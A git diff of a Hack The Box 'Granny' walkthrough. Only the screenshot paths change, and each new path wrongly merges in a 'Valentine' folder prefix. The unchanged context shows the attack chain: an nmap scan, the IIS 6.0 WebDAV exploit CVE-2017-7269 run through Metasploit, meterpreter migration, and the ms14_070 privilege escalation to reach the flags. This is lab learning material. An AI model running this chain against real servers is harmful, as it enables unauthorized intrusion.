@@ -17,7 +17,7 @@ nmap -sV -sC -oA nmap/granny 10.10.10.15
 
 ###### Output 
 
-![](/Windows/Windows-Easy/Granny/Screenshots/nmap.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Granny/Screenshots/nmap.png)
 
 ```sh
 nmap -sV -sC -oA nmap/granny 10.10.10.15                                                                                          ─╯
@@ -49,7 +49,7 @@ port[80]-  httpd 2.4.18
 
 when we naviagate to [http://10.10.10.15](http://10.10.10.15) we find a page that say it under construction 
 
- ![](/Windows/Windows-Easy/Granny/Screenshots/granny.png)
+ ![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Granny/Screenshots/granny.png)
 
 so we know the machine version so what we are going to do is to search for the exploit 
 
@@ -57,7 +57,7 @@ so we know the machine version so what we are going to do is to search for the e
 searchsploit Microsoft IIS 6.0 
 ```
 
-![](/Windows/Windows-Easy/Granny/Screenshots/searchsploit.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Granny/Screenshots/searchsploit.png)
 
 Some searching reveals a remote code execution vulnerability (CVE-2017-7269). There is a proof of concept that requires some modification, as well as a Metasploit module. Lets examine the Remote Buffer Overflow.After Examining the exploit we now Import it to our working directory.
 
@@ -73,13 +73,13 @@ set LHOST 10.10.14.15
 run
 ```
 
-![](/Windows/Windows-Easy/Granny/Screenshots/meterpreter.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Granny/Screenshots/meterpreter.png)
 
 looking at `sysinfo` it refuse because of access probably we are in the 32-bit meterpreter that does not have privillages .We noticed that it running a 32 bit meterpreter so lets migrate to a 32 bit meterpreter with `NT Authority` and be able to run a `local suggester`
 
 After migrating we can now be able to run `sysinfo`
 
-![](/Windows/Windows-Easy/Granny/Screenshots/sy64.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Granny/Screenshots/sy64.png)
 
 now i run suggester to find exploits which are vulnerable
 
@@ -90,7 +90,7 @@ search local_exploit_suggester
 use multi/recon/local_exploit_suggester
 ```
 
-![](/Windows/Windows-Easy/Granny/Screenshots/eploits.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Granny/Screenshots/eploits.png)
 
 looking at the results we find that their are a couple of exploits. In this case lets try this exploit `exploit/windows/local/ms14_070_tcpip_ioctl`
 
@@ -98,14 +98,14 @@ looking at the results we find that their are a couple of exploits. In this case
 use exploit/windows/local/ms14_070_tcpip_ioctl
 ```
 
-![](/Windows/Windows-Easy/Granny/Screenshots/msf.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Granny/Screenshots/msf.png)
 
 and just that way we get shell
 
-![](/Windows/Windows-Easy/Granny/Screenshots/shell.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Granny/Screenshots/shell.png)
 
 we can get the user flag from `C:\Documents and Settings\Lakis\Desktop`  and the root flag from `C:\Documents and Settings\Administrator\Desktop\root.txt`
 
-![](/Windows/Windows-Easy/Granny/Screenshots/root.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Granny/Screenshots/root.png)
 
 	-------------------------END successful attack @lesley----------------------
